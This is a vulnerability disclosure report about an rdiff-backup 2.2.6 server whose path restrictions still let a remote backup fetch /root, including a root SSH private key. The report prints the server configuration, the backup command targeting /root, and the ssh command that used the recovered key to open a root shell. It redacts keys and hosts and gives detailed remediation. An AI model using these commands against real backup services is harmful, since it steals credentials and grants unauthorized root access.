# Unauthorized Access to Protected Files Through rdiff-backup Backup Restrictions

| Field | Details |
|---|---|
| Researcher | [ClearLotus] |
| Date | September 2, 2026 |
| Software | rdiff-backup 2.2.6 |
| Operating System | XXX |
| Severity | Critical |
| Status | Confirmed in the tested environment |
| Target | Redacted |
| Testing Authorization | Authorized test environment only |

> **Responsible disclosure note:** This report documents behavior observed in an authorized test environment. It does not claim that all rdiff-backup versions or deployments are vulnerable. Sensitive infrastructure details, credentials, and private-key material have been redacted.

---

## Executive Summary

During authorized security testing, an `rdiff-backup` 2.2.6 server was configured with `--restrict-path` and `--restrict-mode read-only` controls intended to limit filesystem content accessible through the backup service.

Despite those restrictions, the tested configuration allowed a remote backup operation to retrieve the `/root` directory. The recovered backup contained sensitive root-owned files, including an SSH private key:

```text
/root/.ssh/id_edXXXXX
```

In the authorized test environment, the recovered private key remained valid and was used to authenticate as `root` to the associated system.

The successful SSH authentication is presented as an **impact demonstration**. The primary security issue is the ability to retrieve protected filesystem content through the `rdiff-backup` service despite the intended path restrictions.

---

## Attack Chain

```text
Improperly restricted rdiff-backup configuration
                    │
                    ▼
          Unauthorized filesystem access
                    │
                    ▼
              /root directory recovery
                    │
          ┌─────────┴─────────┐
          ▼                   ▼
    Sensitive files      SSH private key
          │                   │
          ▼                   ▼
 Credential/data exposure  Privileged SSH authentication
```

---

## Affected Software

| Component | Details |
|---|---|
| Software | `rdiff-backup` |
| Tested version | `2.2.6` |
| Operating system | XXX |
| Deployment mode | Remote server mode |
| Tested restriction | `--restrict-mode read-only` |
| Intended allowed path | `/opt/backup` |
| Protected path accessed | `/root` |

The behavior in this report was reproduced against `rdiff-backup` version `2.2.6`.

This research does **not** establish that the behavior affects every version of `rdiff-backup`. Additional testing would be required before making a broader version-wide vulnerability claim.

---

## Vulnerability Description

`rdiff-backup` provides mechanisms intended to limit the filesystem locations available to a remote backup client.

The tested server configuration included the following restrictions:

```bash
sudo /usr/bin/rdiff-backup \
  --server \
  --restrict-path /opt/backup \
  --restrict-mode read-only \
  --restrict-path %s
```

The intended security boundary was to constrain remote backup access to an authorized location and prevent server-side modification.

However, the tested remote backup operation was able to retrieve `/root`.

As a result, the backup service provided an alternate path to files that would otherwise be protected by operating-system filesystem permissions.

---

## Proof of Concept

### Server Configuration

The tested server-side configuration was:

```bash
sudo /usr/bin/rdiff-backup \
  --server \
  --restrict-path /opt/backup \
  --restrict-mode read-only \
  --restrict-path %s
```

The `read-only` restriction prevents modifications through the backup service. The issue demonstrated in this report concerns unauthorized **read access** to protected data.

### Remote Backup Request

The remote backup request used the following schema:

```bash
rdiff-backup \
  --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s" \
  backup::/root \
  /tmp/root_backup
```

> Replace `backup` with a laboratory hostname or a redacted identifier before publication.

The backup operation resulted in a recovered local directory:

```text
/tmp/root_backup
```

---

## Protected Data Recovery

The recovered backup could be inspected locally:

```bash
ls -la /tmp/root_backup
```

The recovered data included the root user's SSH directory:

```bash
ls -la /tmp/root_backup/.ssh
```

Among the recovered files was:

```text
/tmp/root_backup/.ssh/id_edXXXXX
```

This corresponds to the original protected filesystem location:

```text
/root/.ssh/id_edXXXXX
```

The private key material is intentionally excluded from this report.

---

## Impact Demonstration

To evaluate the practical impact of the exposed credential, the recovered private key was tested in the authorized environment against a redacted target:

```bash
ssh -i /tmp/root_backup/.ssh/id_edXXXXX root@<REDACTED-TARGET>
```

Authentication succeeded and returned a privileged shell:

```text
root@<REDACTED-HOST>:~#
```

This confirms that the recovered backup data included an active authentication credential rather than only historical or irrelevant files.

The SSH authentication step should be understood as evidence of impact, not as the underlying vulnerability.

---

## Security Impact

The ability to retrieve `/root` through a backup service can expose more than the SSH private key demonstrated during testing.

Potentially exposed data may include:

- SSH private keys
- Password hashes
- Application credentials
- API keys
- Cloud-provider credentials
- Database credentials
- TLS private keys
- Service configuration files
- Shell history
- Sensitive user or operational data

If recovered credentials remain valid, an attacker may be able to move from backup access to privileged authentication.

```text
Backup access
     ↓
/root recovery
     ↓
Credential recovery
     ↓
SSH authentication
     ↓
root shell
```

---

## Root Cause

The observed issue reflects insufficient separation between the security boundary of the backup service and the protected filesystem.

For example, an ordinary operating-system user may be unable to read:

```text
/root/.ssh/id_edXXXX
```

However, if the same file can be retrieved through a backup service that runs with elevated privileges or is improperly restricted, the backup interface becomes an alternate access path around normal filesystem permissions.

> A backup repository containing privileged filesystem data must be protected to the same security standard as the original data.

---

## Recommended Remediation

### Correct Backup Restrictions

Verify that the rdiff-backup server configuration restricts remote clients to the intended backup directory and prevents access to unrelated absolute paths.

Test the restriction from the perspective of the remote client after every configuration change.

### Avoid Backing Up Sensitive Authentication Material

Where operationally appropriate, exclude sensitive credential directories from general-purpose backups, including:

```text
/root/.ssh/
```

Consider separate, tightly controlled backup processes for privileged credentials that must be retained.

### Rotate Exposed Credentials

Any private SSH key recovered by an unauthorized party should be considered compromised.

Recommended response:

1. Remove or revoke the affected public key from authorized systems.
2. Generate a new key pair.
3. Update approved access configurations.
4. Review authentication logs for prior use of the exposed key.

### Protect Backup Repositories

Apply strict access controls to backup data and services.

- Restrict access to authorized administrators and backup processes.
- Avoid unnecessary use of privileged service accounts.
- Ensure remote backup identities have only the minimum required permissions.
- Audit backup-service configuration changes.
- Monitor remote backup activity.

### Encrypt Backup Data

Sensitive backups should be encrypted at rest.

Encryption keys should be stored and protected separately from the backup repository itself.

### Review Historical Backups

Removing a credential from the live filesystem does not remove historical copies from backup archives.

Review existing and retained backups for:

- SSH private keys
- API tokens
- Cloud credentials
- Database passwords
- Application secrets
- TLS keys
- Configuration files containing credentials

---

## Detection and Validation

After remediation, administrators should validate that:

- Remote backup clients can access only the intended backup path.
- `/root` cannot be retrieved through the backup service unless explicitly authorized.
- Private SSH keys are not present in broadly accessible backup repositories.
- Exposed SSH keys have been revoked and replaced.
- Authentication logs have been reviewed for use of exposed credentials.
- Historical backups have been evaluated for retained copies of sensitive material.
- Backup-service processes do not run with more privilege than necessary.

A useful validation test is to attempt access to several paths outside the intended backup directory, including protected directories such as:

```text
/root
/etc
/home
/var
```

Those attempts should fail unless the paths are explicitly authorized by the backup design.

---

## Research Limitations

This finding documents behavior reproduced in the following tested environment:

```text
rdiff-backup: 2.2.6
Operating system: Ubuntu XXX
Mode: Remote server mode
```

The research does not currently establish whether the observed behavior is:

- Specific to version `2.2.6`
- Present in other rdiff-backup versions
- Dependent on the exact `--restrict-path` syntax or placement
- Dependent on how the remote service is invoked
- Dependent on the use of `sudo`
- A configuration error, design limitation, or intended behavior being misunderstood

Further testing across additional versions, operating systems, privilege models, and restriction configurations is necessary to determine the full scope.

Accordingly, this report describes an **observed security behavior in a tested environment**. It does not assign a CVE or claim that every rdiff-backup deployment is vulnerable.

---

## Redaction

The following information has been intentionally removed from this publication:

- Target IP address
- Target hostname
- SSH host fingerprint
- Private-key contents
- Environment-specific usernames
- Environment-specific credentials
- Internal network details

The following placeholders are used:

```text
<REDACTED-TARGET>
<REDACTED-HOST>
```

This preserves the educational and technical value of the research while avoiding disclosure of sensitive infrastructure information or authentication material.

---

## Conclusion

The tested `rdiff-backup` configuration allowed recovery of files from `/root` despite restrictions intended to limit remote filesystem access.

The recovered backup included a root SSH private key. In the authorized test environment, that key remained valid and enabled privileged SSH authentication.

The core finding is the unintended exposure of protected filesystem data through the backup service:

```text
rdiff-backup access
       ↓
Protected filesystem access
       ↓
Sensitive credential exposure
       ↓
Privileged authentication
```

This finding reinforces that backup systems are privileged security boundaries. Backup contents, backup-service configuration, repository permissions, retention policies, and encryption controls should receive the same security attention as the original systems and data they protect.

